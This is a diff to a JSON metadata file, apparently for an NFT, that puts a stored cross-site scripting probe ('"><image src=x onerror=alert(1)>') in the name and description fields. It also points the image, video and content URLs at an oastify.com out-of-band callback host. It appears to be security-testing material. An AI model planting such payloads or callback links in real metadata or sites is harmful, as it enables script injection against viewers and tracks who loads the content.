@@ -1,6 +1,8 @@
 {
-  "name": "\"><image src=x onerror=alert(1)> <b>Nama</b>",
-  "description": "\"><image src=x onerror=alert(1)> <b>Deskripsi</b>",
-  "image": "https://tesxss.vercel.app/xss.svg",
-  "social_links": []
+  "name": "\"><image src=x onerror=alert(1)> <b>#0</b>",
+  "description": "\"><image src=x onerror=alert(1)> <b>Deskripsi 0</b>",
+  "image": "https://lazyjljq5u6ydc2wi7383am4ivomco0d.oastify.com/xss.svg",
+  "video": "https://lazyjljq5u6ydc2wi7383am4ivomco0d.oastify.com/?video=/nft/0/video.mp4",
+  "content_url": "https://lazyjljq5u6ydc2wi7383am4ivomco0d.oastify.com/?content=/nft/0/video.mp4",
+  "attributes": []
 }
